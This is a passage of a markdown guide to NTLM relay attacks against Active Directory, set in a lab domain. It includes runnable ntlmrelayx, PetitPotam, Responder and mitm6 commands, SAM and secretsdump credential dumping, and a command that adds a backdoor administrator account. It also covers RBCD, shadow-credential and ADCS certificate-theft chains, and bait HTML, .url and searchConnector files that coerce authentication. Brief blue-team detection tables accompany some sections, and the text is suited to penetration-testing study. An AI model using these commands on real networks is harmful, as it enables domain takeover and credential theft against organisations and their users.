# NTLM Relay Attacks - Complete Guide

A comprehensive guide to NTLM relay attacks - including concepts, lab setup, attack methods, alternatives, and blue team detection.

---

## Table of Contents

1. [Understanding NTLM Relay](#understanding-ntlm-relay)
2. [SMB to SMB Relay](#1-smb-to-smb-relay)
3. [SMB to LDAP/LDAPS Relay](#2-smb-to-ldapldaps-relay)
4. [SMB to HTTP/HTTPS Relay](#3-smb-to-httphttps-relay)
5. [HTTP to SMB Relay](#4-http-to-smb-relay)
6. [HTTP to LDAP Relay](#5-http-to-ldap-relay)
7. [WebDAV Relay](#6-webdav-relay)
8. [ADCS ESC8 - HTTP Enrollment Relay](#7-adcs-esc8---http-enrollment-relay)
9. [Shadow Credentials via Relay](#8-shadow-credentials-via-relay)
10. [RBCD via Relay](#9-rbcd-via-relay)
11. [SOCKS Relay (Multi-Target)](#10-socks-relay-multi-target)
12. [IPv6 Relay Attacks](#ipv6-relay-attacks)
13. [Cross-Protocol Relay Matrix](#cross-protocol-relay-matrix)
14. [Coercion Methods](#coercion-methods)
15. [Blue Team: Comprehensive Detection](#blue-team-comprehensive-detection)
16. [Blue Team: Comprehensive Prevention](#blue-team-comprehensive-prevention)

---

# Understanding NTLM Relay

## How NTLM Authentication Works

```
┌──────────┐                    ┌──────────┐
│  Client  │                    │  Server  │
└────┬─────┘                    └────┬─────┘
     │                               │
     │ 1. NEGOTIATE (NTLMSSP)        │
     │──────────────────────────────>│
     │                               │
     │ 2. CHALLENGE (Server Nonce)   │
     │<──────────────────────────────│
     │                               │
     │ 3. AUTHENTICATE               │
     │   (Response = Hash(Nonce))    │
     │──────────────────────────────>│
     │                               │
     │ 4. Success/Failure            │
     │<──────────────────────────────│
```

## How Relay Works

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Victim  │         │ Attacker │         │  Target  │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │ 1. NEGOTIATE       │                    │
     │───────────────────>│                    │
     │                    │ 1'. NEGOTIATE      │
     │                    │───────────────────>│
     │                    │                    │
     │                    │ 2'. CHALLENGE      │
     │                    │<───────────────────│
     │ 2. CHALLENGE       │                    │
     │<───────────────────│                    │
     │                    │                    │
     │ 3. AUTHENTICATE    │                    │
     │───────────────────>│                    │
     │                    │ 3'. AUTHENTICATE   │
     │                    │───────────────────>│
     │                    │                    │
     │                    │ 4'. SUCCESS!       │
     │                    │<───────────────────│
     │                    │                    │
     │                    │ Attacker now has   │
     │                    │ authenticated      │
     │                    │ session as Victim  │
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Coercion** | Forcing a victim to authenticate to the attacker |
| **Relay** | Forwarding authentication to a different target |
| **Cross-Protocol** | Relaying from one protocol to another (SMB→LDAP) |
| **Signing** | Cryptographic protection that prevents relay |
| **EPA** | Extended Protection for Authentication (channel binding) |

## What Makes Relay Possible

| Requirement | Description |
|-------------|-------------|
| No Signing | Target doesn't require message signing |
| No EPA | Target doesn't enforce channel binding |
| Coercion | Attacker can force victim to authenticate |
| Privileges | Victim has useful rights on target |

---

# 1. SMB to SMB Relay

## Concept

Relay SMB authentication from one machine to another machine's SMB service. Classic relay attack.

## Root Cause

| Factor | Description |
|--------|-------------|
| SMB Signing Disabled | Target doesn't require SMB signing |
| Same Credentials | Victim has admin rights on target |
| Coercion Possible | Can force victim to connect to attacker |

## Lab Setup: Make It Vulnerable

**Step 1: Disable SMB Signing on WS01 (target)**

```powershell
# On WS01 - Run as Administrator
# Disable SMB Signing requirement

# Server side (incoming connections)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 0

# Client side (outgoing connections)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "EnableSecuritySignature" -Value 0

Write-Host "SMB Signing disabled - REBOOT REQUIRED" -ForegroundColor Yellow
Restart-Computer -Force
```

**Step 2: Verify SMB Signing is disabled**

```bash
# From Kali
crackmapexec smb 192.168.56.11 --gen-relay-list relay-targets.txt
# If WS01 appears in the list, it's vulnerable
```

## Attack Methods

**Method 1: ntlmrelayx Basic Relay**

```bash
# Terminal 1: Start relay server
# Relay to WS01, execute command when admin connects
ntlmrelayx.py -t smb://192.168.56.11 -smb2support -c "whoami > C:\\relay-proof.txt"

# Terminal 2: Coerce DC to authenticate to us
# PetitPotam (if unpatched)
python3 PetitPotam.py 192.168.56.100 192.168.56.10

# Or PrinterBug
python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@192.168.56.10 192.168.56.100
```

**Method 2: ntlmrelayx with SAM Dump**

```bash
# Dump SAM database when admin relays
ntlmrelayx.py -t smb://192.168.56.11 -smb2support

# When successful, you'll see:
# [*] Dumping SAM hashes
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:...
```

**Method 3: ntlmrelayx Interactive Shell**

```bash
# Get interactive shell
ntlmrelayx.py -t smb://192.168.56.11 -smb2support -i

# When relay succeeds:
# [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000

# Connect to shell
nc 127.0.0.1 11000
# > shares
# > use C$
# > ls
```

**Method 4: Responder + ntlmrelayx**

```bash
# Terminal 1: Disable SMB/HTTP in Responder (we relay, not capture)
sudo vim /etc/responder/Responder.conf
# Set: SMB = Off, HTTP = Off

# Start Responder for poisoning
sudo responder -I eth0 -dwP

# Terminal 2: Start relay
ntlmrelayx.py -tf relay-targets.txt -smb2support -c "net user hacker Password123! /add && net localgroup administrators hacker /add"

# Wait for LLMNR/NBT-NS poisoning to capture auth
# Or actively coerce
```

### Alternative Methods

**Using Impacket smbrelayx (older)**
```bash
smbrelayx.py -h 192.168.56.11 -c "whoami"
```

**Using MultiRelay (Responder's built-in)**
```bash
# In Responder.conf, enable:
# HTTP = Off, SMB = Off
python3 MultiRelay.py -t 192.168.56.11 -u ALL
sudo responder -I eth0 -dwP
```

**Using CrackMapExec with relay**
```bash
# CME can use relayed sessions
ntlmrelayx.py -t smb://192.168.56.11 -smb2support -socks

# In another terminal
proxychains crackmapexec smb 192.168.56.11 -u '' -p '' --sam
```

## Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4624 | Logon Type 3 from unexpected sources |
| Event ID 4625 | Failed logons (relay attempts) |
| Event ID 5145 | Share access from unusual IPs |
| Network | NTLM traffic patterns, MitM indicators |
| Sysmon ID 3 | Network connections to rogue IPs |

**Detection Rules:**
```
# SMB auth from non-standard ports
IF source_port NOT IN (445, 139)
AND destination_port IN (445, 139)
AND auth_protocol = NTLM
THEN ALERT

# Same auth relayed to multiple targets
IF ntlm_challenge seen at multiple destinations within 5 seconds
THEN ALERT "Potential NTLM Relay"
```

## Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Enable SMB Signing | GPO: Microsoft network server: Digitally sign communications (always) |
| Disable NTLM | GPO: Network security: Restrict NTLM |
| Protected Users | Add sensitive accounts to Protected Users group |
| Firewall | Block outbound SMB to untrusted networks |

---

# 2. SMB to LDAP/LDAPS Relay

## Concept

Relay SMB authentication to LDAP to modify Active Directory objects. More powerful than SMB relay because you can:
- Add users to groups
- Modify ACLs
- Set up RBCD
- Add shadow credentials

## Root Cause

| Factor | Description |
|--------|-------------|
| LDAP Signing Disabled | DC doesn't require LDAP signing |
| No Channel Binding | LDAPS without EPA |
| Machine Account Rights | Computer accounts can modify themselves |

## Lab Setup: Make It Vulnerable

**Check current LDAP signing requirements:**

```powershell
# On DC - Check LDAP signing policy
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue

# Values: 0 = None, 1 = Signing if requested, 2 = Required
```

**Disable LDAP Signing (if needed for lab):**

```powershell
# On DC - Disable LDAP signing requirement
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 1

# Or via GPO:
# Computer Configuration > Policies > Windows Settings > Security Settings >
# Local Policies > Security Options >
# Domain controller: LDAP server signing requirements = None

# Restart DC or NTDS service
Restart-Service NTDS -Force
```

**Verify LDAP Signing status:**

```bash
# From Kali - Check LDAP signing
crackmapexec ldap 192.168.56.10 -u orochimaru -p 'Snake2024!' -M ldap-checker
```

## Attack Methods

**Method 1: RBCD Attack via LDAP Relay**

```bash
# Relay to LDAP, configure RBCD on target computer
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access --escalate-user 'YOURPC$'

# Coerce a machine account to authenticate
python3 PetitPotam.py 192.168.56.100 192.168.56.11  # Coerce WS01

# If successful:
# [*] Attempting to create computer in: CN=Computers,DC=akatsuki,DC=local
# [*] Adding new computer with username: YOURPC$ and password: <random>
# [*] Delegation rights modified successfully!

# Now abuse RBCD
getST.py -spn cifs/WS01.akatsuki.local AKATSUKI/'YOURPC$':'<password>' -impersonate administrator -dc-ip 192.168.56.10

export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass WS01.akatsuki.local
```

**Method 2: Add User to Group via LDAP**

```bash
# Relay to LDAP, add user to Domain Admins
ntlmrelayx.py -t ldap://192.168.56.10 --escalate-user orochimaru

# When Domain Admin authenticates to us, orochimaru gets added to Domain Admins
```

**Method 3: Shadow Credentials via LDAP**

```bash
# Relay to LDAP, add shadow credentials
ntlmrelayx.py -t ldap://192.168.56.10 --shadow-credentials --shadow-target 'WS01$'

# Coerce WS01's machine account
python3 PetitPotam.py 192.168.56.100 192.168.56.11

# If successful, you get a certificate to auth as WS01$
# Use PKINITtools to get TGT
```

**Method 4: LDAPS Relay (if LDAP signing enabled)**

```bash
# If LDAP signing is required, try LDAPS (often lacks channel binding)
ntlmrelayx.py -t ldaps://192.168.56.10 --delegate-access

# Note: Requires LDAPS to not have EPA/channel binding
```

### Alternative Methods

**Using ldeep for LDAP operations**
```bash
# After getting session via relay SOCKS
proxychains ldeep ldap -d akatsuki.local -s ldap://192.168.56.10 -u '' -p '' all
```

**Manual LDAP modification via relay**
```bash
ntlmrelayx.py -t ldap://192.168.56.10 -smb2support --add-computer YOURPC 'Password123!'
```

## Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4662 | DS-Access on msDS-AllowedToActOnBehalfOfOtherIdentity |
| Event ID 5136 | Directory service object modification |
| Event ID 4742 | Computer account changed |
| Event ID 4728/4732 | User added to privileged group |

## Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Require LDAP Signing | GPO: Domain controller: LDAP server signing requirements = Require signing |
| Enable Channel Binding | Registry: LdapEnforceChannelBinding = 2 |
| Protected Users | Prevents NTLM for members |
| Monitor RBCD | Alert on msDS-AllowedToActOnBehalfOfOtherIdentity changes |

---

# 3. SMB to HTTP/HTTPS Relay

## Concept

Relay SMB authentication to web services that accept NTLM authentication. Common targets:
- Exchange Web Services (EWS)
- ADCS Web Enrollment
- SharePoint
- SCCM

## Root Cause

| Factor | Description |
|--------|-------------|
| NTLM Auth Enabled | Web service accepts NTLM |
| No EPA | No Extended Protection for Authentication |
| Cross-Protocol | HTTP doesn't validate source protocol |

## Lab Setup: Enable HTTP NTLM Auth

```powershell
# On a web server (IIS)
# Enable Windows Authentication with NTLM

Import-Module WebAdministration

# Enable Windows Auth on default site
Set-WebConfigurationProperty -Filter "/system.webServer/security/authentication/windowsAuthentication" -Name "enabled" -Value "true" -PSPath "IIS:\Sites\Default Web Site"

# Disable Extended Protection (makes it vulnerable)
Set-WebConfigurationProperty -Filter "/system.webServer/security/authentication/windowsAuthentication/extendedProtection" -Name "tokenChecking" -Value "None" -PSPath "IIS:\Sites\Default Web Site"
```

## Attack Methods

**Method 1: Relay to Exchange (EWS)**

```bash
# Relay SMB to Exchange Web Services
ntlmrelayx.py -t https://exchange.akatsuki.local/EWS/Exchange.asmx -smb2support

# When admin authenticates, you can:
# - Read emails
# - Send emails
# - Access calendar
```

**Method 2: Relay to SCCM**

```bash
# Relay to SCCM Admin Service
ntlmrelayx.py -t https://sccm.akatsuki.local/AdminService/wmi -smb2support
```

### Alternative Methods

**Using Metasploit**
```bash
use auxiliary/server/http_ntlmrelay
set RHOST target.local
set RPORT 443
set RURIPATH /sensitive/endpoint
run
```

## Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| HTTP logs showing NTLM from unusual sources | Enable EPA on all web services |
| Cross-protocol auth patterns | Disable NTLM for web services |
| Unexpected service access | Require Kerberos |

---

# 4. HTTP to SMB Relay

## Concept

Capture HTTP NTLM authentication and relay it to SMB. Useful when:
- User clicks malicious link
- Visiting attacker-controlled page
- Exploiting SSRF

## Root Cause

| Factor | Description |
|--------|-------------|
| Auto-Auth | Browser auto-authenticates to intranet sites |
| WebDAV | Triggers SMB-like authentication over HTTP |
| No Signing | Target SMB doesn't require signing |

## Lab Setup

```powershell
# Ensure target (WS01) has SMB signing disabled (see section 1)
# No special setup for HTTP capture - browser does it automatically
```

## Attack Methods

**Method 1: Malicious HTML Page**

```bash
# Create HTML that triggers auth
cat > evil.html << 'EOF'
<html>
<body>
<img src="file://192.168.56.100/share/image.png">
<img src="\\192.168.56.100\share\image.png">
</body>
</html>
EOF

# Host it
python3 -m http.server 8080

# Start relay
ntlmrelayx.py -t smb://192.168.56.11 -smb2support

# Trick user to visit: http://192.168.56.100:8080/evil.html
```

**Method 2: Responder HTTP Capture + Relay**

```bash
# Responder captures HTTP NTLM, ntlmrelayx relays it
# Edit Responder.conf: HTTP = On, SMB = Off

sudo responder -I eth0 -wdP
ntlmrelayx.py -t smb://192.168.56.11 -smb2support
```

**Method 3: WPAD Poisoning**

```bash
# Responder serves malicious WPAD
sudo responder -I eth0 -wdP

# Browsers auto-fetch http://wpad/wpad.dat
# Auth captured and relayed
```

### Alternative Methods

**Using WebDAV**
```bash
# Start WebDAV server that captures NTLM
ntlmrelayx.py -t smb://192.168.56.11 -smb2support --serve-image /path/to/bait.png
```

## Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| Outbound HTTP auth to unusual hosts | Disable WPAD (GPO) |
| LLMNR/NBT-NS poisoning | Disable LLMNR/NBT-NS |
| WebDAV to external | Block outbound WebDAV |

---

# 5. HTTP to LDAP Relay

## Concept

Capture HTTP NTLM authentication and relay to LDAP for AD modifications.

## Root Cause

| Factor | Description |
|--------|-------------|
| HTTP Auth | Web application uses NTLM |
| LDAP No Signing | LDAP doesn't require signing |
| User Rights | Authenticated user can modify AD objects |

## Lab Setup

Same as LDAP relay setup - ensure LDAP signing is not required.

## Attack Methods

**Method 1: Web Page to LDAP RBCD**

```bash
# Start HTTP server that triggers auth
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access --serve-image bait.png

# Trick user to visit page with:
# <img src="http://192.168.56.100/bait.png">

# When Domain Admin visits, their auth is relayed to set up RBCD
```

**Method 2: ADIDNS Poisoning to HTTP to LDAP**

```bash
# Add DNS record pointing to attacker
python3 dnstool.py -u 'AKATSUKI\orochimaru' -p 'Snake2024!' -r attacker.akatsuki.local -a add -d 192.168.56.100 192.168.56.10

# Start relay
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access

# Wait for DNS lookups to attacker.akatsuki.local
```

## Blue Team: Detection & Prevention

Same as LDAP relay - enable LDAP signing and EPA.

---

# 6. WebDAV Relay

## Concept

WebDAV (Web Distributed Authoring and Versioning) uses HTTP but triggers NTLM auth for file operations. It's often less protected than SMB.

## Root Cause

| Factor | Description |
|--------|-------------|
| WebClient Service | Windows service handles WebDAV |
| Auto-Auth | Windows auto-authenticates |
| Less Monitoring | WebDAV often overlooked |

## Lab Setup: Enable WebDAV

```powershell
# On workstation - Enable WebClient service
Set-Service -Name WebClient -StartupType Automatic
Start-Service WebClient

# Verify
Get-Service WebClient
```

## Attack Methods

**Method 1: Coerce via WebDAV**

```bash
# Start relay
ntlmrelayx.py -t smb://192.168.56.11 -smb2support

# Coerce using WebDAV path
# From compromised machine or phishing:
dir \\192.168.56.100@80\share\

# Or using PetitPotam with WebDAV path
python3 PetitPotam.py '192.168.56.100@80/path' 192.168.56.11
```

**Method 2: Searchconnector-ms File**

```bash
# Create searchConnector-ms file
cat > Documents.searchConnector-ms << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>http://192.168.56.100/</url>
    </simpleLocation>
</searchConnectorDescription>
EOF

# When user clicks, WebDAV auth triggered
```

**Method 3: URL File**

```bash
# Create URL file
cat > clickme.url << 'EOF'
[InternetShortcut]
URL=file://192.168.56.100/share
EOF
```

### Alternative Methods

**Library-ms files**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>http://192.168.56.100/</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

## Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| WebClient connecting to external | Disable WebClient service |
| HTTP NTLM to non-standard hosts | Block outbound WebDAV |
| Suspicious file types (.searchConnector-ms) | Application control |

---

# 7. ADCS ESC8 - HTTP Enrollment Relay

## Concept

Relay authentication to Active Directory Certificate Services (ADCS) Web Enrollment to request a certificate as the victim. Then use the certificate to authenticate.

## Root Cause

| Factor | Description |
|--------|-------------|
| HTTP Enrollment | ADCS has web enrollment enabled |
| No EPA | Web enrollment lacks Extended Protection |
| NTLM Allowed | Endpoint accepts NTLM authentication |

## Lab Setup: Install ADCS with Web Enrollment

```powershell
# On DC - Install ADCS with Web Enrollment
Install-WindowsFeature ADCS-Cert-Authority, ADCS-Web-Enrollment -IncludeManagementTools

# Configure CA
Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -CACommonName "AKATSUKI-CA" -Force

# Configure Web Enrollment
Install-AdcsWebEnrollment -Force

# Verify
Get-Service CertSvc
# Browse to: http://dc01.akatsuki.local/certsrv/
```

**Check if vulnerable:**

```bash
# From Kali
certipy find -u orochimaru@akatsuki.local -p 'Snake2024!' -dc-ip 192.168.56.10 -vulnerable

# Look for ESC8 in output
```

## Attack Methods

**Method 1: Relay to ADCS Web Enrollment**

```bash
# Start relay targeting ADCS web enrollment
ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC to authenticate
python3 PetitPotam.py 192.168.56.100 192.168.56.10

# If successful:
# [*] Certificate retrieved successfully
# [*] Saving certificate to DC01$.pfx

# Authenticate with certificate
certipy auth -pfx DC01$.pfx -dc-ip 192.168.56.10

# Get NT hash of DC machine account
# Now you can DCSync!
```

**Method 2: Using Certipy Relay**

```bash
# Certipy has built-in relay
certipy relay -ca 192.168.56.10 -template DomainController

# Coerce target
python3 PetitPotam.py 192.168.56.100 192.168.56.10
```

**Method 3: Request User Certificate**

```bash
# Relay to get certificate for user template
ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp -smb2support --adcs --template User

# Coerce/wait for user to authenticate
# Get certificate as that user
```

### Alternative Methods

**Using Coercer for automatic coercion**
```bash
# Terminal 1
ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2
coercer -u orochimaru -p 'Snake2024!' -d akatsuki.local -t 192.168.56.10 -l 192.168.56.100
```

## Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4768 | Certificate-based authentication |
| Event ID 4886/4887 | Certificate request/issue |
| ADCS logs | Certificate requests from unusual sources |
| Network | HTTP to /certsrv from non-browser |

## Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Disable HTTP Enrollment | Use HTTPS only with EPA |
| Require EPA | IIS Extended Protection |
| Disable NTLM on ADCS | Require Kerberos auth |
| Disable unnecessary templates | Remove enrollment rights |

---

# 8. Shadow Credentials via Relay

## Concept

Relay authentication to LDAP to add "shadow credentials" (msDS-KeyCredentialLink) to a computer account. This allows you to authenticate as that computer using PKINIT.

## Root Cause

| Factor | Description |
|--------|-------------|
| LDAP No Signing | Can relay to LDAP |
| Write to KeyCredential | Can modify msDS-KeyCredentialLink |
| PKINIT Enabled | Domain supports certificate auth |

## Lab Setup

Same as LDAP relay setup. Additionally, verify PKINIT is supported:

```bash
# Check if PKINIT works
certipy find -u orochimaru@akatsuki.local -p 'Snake2024!' -dc-ip 192.168.56.10
```

## Attack Methods

**Method 1: ntlmrelayx Shadow Credentials**

```bash
# Relay to LDAP and add shadow credentials
ntlmrelayx.py -t ldap://192.168.56.10 --shadow-credentials --shadow-target 'WS01$'

# Coerce WS01
python3 PetitPotam.py 192.168.56.100 192.168.56.11

# Output:
# [*] Updating target computer 'WS01$' with shadow credentials
# [*] Shadow credentials successfully added!
# [*] Certificate: <base64>
# [*] Key: <base64>

# Save certificate and key
# Then authenticate
certipy auth -pfx WS01.pfx -dc-ip 192.168.56.10
```

**Method 2: Using pywhisker**

```bash
# If you already have a session (via SOCKS relay)
proxychains pywhisker -d akatsuki.local -u '' -p '' --target 'WS01$' --action add
```

### Alternative Methods

**Using Whisker (C#)**
```powershell
# If on Windows with relay session
.\Whisker.exe add /target:WS01$ /domain:akatsuki.local
```

## Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 5136 | Modification of msDS-KeyCredentialLink |
| Event ID 4768 | PKINIT authentication with new certificate |

## Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| LDAP Signing | Require LDAP signing |
| Monitor KeyCredential | Alert on msDS-KeyCredentialLink changes |
| Protected Users | Members can't use PKINIT |

---

# 9. RBCD via Relay

## Concept

Relay to LDAP to configure Resource-Based Constrained Delegation (RBCD) on a target computer, then abuse it for admin access.

## Root Cause

| Factor | Description |
|--------|-------------|
| LDAP No Signing | Can relay to LDAP |
| Write to Computer | Can modify msDS-AllowedToActOnBehalfOfOtherIdentity |
| Machine Account | Need a controlled machine account |

## Lab Setup

Same as LDAP relay setup.

## Attack Methods

**Method 1: Full RBCD Attack Chain**

```bash
# Step 1: Start relay to set up RBCD
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access --escalate-user 'YOURPC$'

# Step 2: Coerce target machine
python3 PetitPotam.py 192.168.56.100 192.168.56.11

# ntlmrelayx output:
# [*] Attempting to create computer in: CN=Computers,DC=akatsuki,DC=local
# [*] Adding new computer with username: YOURPC$ and password: RandomPass123
# [*] Delegation rights modified successfully!
# [*] YOURPC$ can now impersonate users on WS01$

# Step 3: Get service ticket as admin
getST.py -spn cifs/WS01.akatsuki.local AKATSUKI/'YOURPC$':'RandomPass123' -impersonate administrator -dc-ip 192.168.56.10

# Step 4: Use ticket
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass WS01.akatsuki.local
```

**Method 2: With Existing Machine Account**

```bash
# If you already have a machine account
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access --escalate-user 'YOURPC$' --no-create-computer

# Then use existing machine account credentials for S4U
```

### Alternative Methods

**Using rbcd-attack**
```bash
# Standalone RBCD attack tool
python3 rbcd-attack.py -d akatsuki.local -u '' -p '' -t WS01$ -f YOURPC$ -dc-ip 192.168.56.10
```

## Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 5136 | Changes to msDS-AllowedToActOnBehalfOfOtherIdentity |
| Event ID 4742 | Computer account modified |
| Event ID 4769 | S4U2Proxy ticket requests |

## Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| LDAP Signing | Require LDAP signing |
| MachineAccountQuota = 0 | Prevent computer creation |
| Monitor RBCD | Alert on delegation attribute changes |

---

# 10. SOCKS Relay (Multi-Target)

## Concept

Instead of executing actions immediately, relay authentication and keep sessions in a SOCKS proxy. Allows you to:
- Use one auth against multiple targets
- Interactive sessions
- Use other tools via proxy

## Root Cause

Session persistence allows extended access.

## Lab Setup

Same as other relay attacks.

## Attack Methods

**Method 1: SOCKS Relay with ntlmrelayx**

```bash
# Start relay with SOCKS
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Coerce or wait for auth
python3 PetitPotam.py 192.168.56.100 192.168.56.10

# Check active sessions
ntlmrelayx> socks
# Protocol  Target          Username        AdminStatus  Port
# --------  --------------  --------------  -----------  ----
# SMB       192.168.56.11   AKATSUKI/DC01$  TRUE         445

# Use session via proxychains
proxychains secretsdump.py -no-pass 'AKATSUKI/DC01$'@192.168.56.11
proxychains crackmapexec smb 192.168.56.11 -u 'DC01$' -p '' --sam
proxychains smbclient //192.168.56.11/C$ -U 'AKATSUKI/DC01$' --pw-nt-hash ''
```

**Method 2: Interactive LDAP via SOCKS**

```bash
ntlmrelayx.py -t ldap://192.168.56.10 -smb2support -socks

# After getting session
proxychains ldapsearch -H ldap://192.168.56.10 -x -b "DC=akatsuki,DC=local"
```

**Method 3: Multiple Protocol SOCKS**

```bash
# Relay to multiple protocols
ntlmrelayx.py -tf targets.txt -smb2support -socks

# targets.txt:
# smb://192.168.56.11
# ldap://192.168.56.10
# http://192.168.56.10/certsrv/certfnsh.asp
```

## Blue Team: Detection & Prevention

Same as individual attack types. SOCKS just extends session lifetime.

---

# IPv6 Relay Attacks

## Overview

Windows prefers IPv6 over IPv4 by default. In most networks, IPv6 isn't properly configured, which creates a powerful attack surface. An attacker can:

1. Respond to DHCPv6 requests to become the DNS server
2. Serve malicious DNS responses for any query
3. Redirect traffic to capture NTLM authentication
4. Relay captured authentication to targets

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        IPv6 Relay Attack Flow                           │
└─────────────────────────────────────────────────────────────────────────┘

         DHCPv6 Solicit           DHCPv6 Reply (Attacker = DNS)
┌────────┐  ─────────────>  ┌──────────┐  <─────────────────  ┌────────┐
│ Victim │                  │ Network  │                      │Attacker│
│   PC   │                  │          │                      │ mitm6  │
└───┬────┘                  └──────────┘                      └───┬────┘
    │                                                             │
    │ DNS Query: wpad.akatsuki.local                              │
    │ ─────────────────────────────────────────────────────────> │
    │                                                             │
    │ DNS Reply: wpad = 192.168.56.100 (Attacker)                │
    │ <───────────────────────────────────────────────────────── │
    │                                                             │
    │ HTTP GET /wpad.dat (NTLM Auth)                              │
    │ ─────────────────────────────────────────────────────────> │
    │                                                             │
    │                     RELAY to LDAP/SMB/HTTP                  │
    │                                           ┌────────────────┐│
    │                                           │ Target (DC01)  ││
    │                                           │ LDAP/SMB/HTTP  ││
    │                                           └────────────────┘│
```

---

## 11. mitm6 - DHCPv6 DNS Takeover

### Concept

Abuse Windows' preference for IPv6 to become the DNS server via DHCPv6. Once you're the DNS server, you can resolve any hostname to your IP and capture NTLM authentication.

### Root Cause

| Factor | Description |
|--------|-------------|
| IPv6 Enabled | Windows enables IPv6 by default |
| DHCPv6 Trusted | Windows accepts DHCPv6 replies from any source |
| DNS Priority | IPv6 DNS has higher priority than IPv4 |
| WPAD Enabled | Browsers auto-fetch proxy configuration |
| Auto-Auth | Windows auto-authenticates to intranet resources |

### Lab Setup: Verify IPv6 is Enabled

```powershell
# On workstations - Check IPv6 status (enabled by default)
Get-NetAdapterBinding -ComponentID ms_tcpip6

# Check if WPAD is enabled (default)
# Internet Options > Connections > LAN Settings > "Automatically detect settings"

# For testing, ensure WPAD is enabled:
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" -Name "WpadOverride" -Value 0 -Type DWord -Force
```

### Attack Methods

**Method 1: mitm6 + ntlmrelayx to LDAP**

```bash
# Terminal 1: Start mitm6 (DHCPv6 + DNS spoofing)
sudo mitm6 -d akatsuki.local -i eth0

# Options:
# -d : Target domain
# -i : Interface
# --ignore-nofqdn : Ignore queries without FQDN

# Terminal 2: Start relay to LDAP for RBCD
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access -smb2support -wh attacker-wpad

# -wh : Hostname for WPAD proxy
# When machine accounts authenticate, RBCD is configured

# Wait for victims to send DHCPv6 requests (happens periodically ~30 min)
# Or trigger with: ipconfig /renew6
```

**Method 2: mitm6 + ntlmrelayx to ADCS**

```bash
# Terminal 1: mitm6
sudo mitm6 -d akatsuki.local -i eth0

# Terminal 2: Relay to ADCS for certificate
ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp --adcs -smb2support -wh attacker-wpad --template DomainController

# When DC01$ authenticates:
# [*] Got certificate for DC01$
# [*] Base64 certificate of user DC01$ saved to DC01.b64
```

**Method 3: mitm6 + ntlmrelayx to SMB**

```bash
# Terminal 1: mitm6
sudo mitm6 -d akatsuki.local -i eth0

# Terminal 2: Relay to SMB targets without signing
ntlmrelayx.py -tf smb-targets.txt -smb2support -wh attacker-wpad

# Create smb-targets.txt with machines that have SMB signing disabled
# crackmapexec smb 192.168.56.0/24 --gen-relay-list smb-targets.txt
```

**Method 4: mitm6 + ntlmrelayx for Shadow Credentials**

```bash
# Terminal 1: mitm6
sudo mitm6 -d akatsuki.local -i eth0

# Terminal 2: Relay to LDAP for shadow credentials
ntlmrelayx.py -t ldap://192.168.56.10 --shadow-credentials --shadow-target 'WS01$' -smb2support -wh attacker-wpad

# When WS01$ authenticates via IPv6 DNS:
# [*] Updating target computer 'WS01$' with shadow credentials
